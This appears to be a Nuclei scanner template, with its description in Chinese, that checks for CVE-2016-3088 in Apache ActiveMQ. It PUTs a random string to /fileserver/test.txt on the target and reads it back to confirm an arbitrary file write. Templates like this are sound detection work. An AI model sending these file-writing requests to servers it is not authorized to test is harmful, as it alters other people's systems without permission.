id: CVE-2016-3088

info:
  name: Apache ActiveMQ 文件服务器 - 任意文件写入(CVE-2016-3088)
  author: fq_hsu
  severity: critical
  description: Apache ActiveMQ 5.x 到 5.14.0 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录.
  tags: activemq
  metadata:
    max-request: 2

http:
  - raw:
      - |
        PUT /fileserver/test.txt HTTP/1.1
        Host: {{Hostname}}

        {{randstr}}

      - |
        GET /fileserver/test.txt HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1==204"
          - "status_code_2==200"
          - "contains((body_2), '{{randstr}}')"
        condition: and

# Enhanced by mp on 2022/04/22
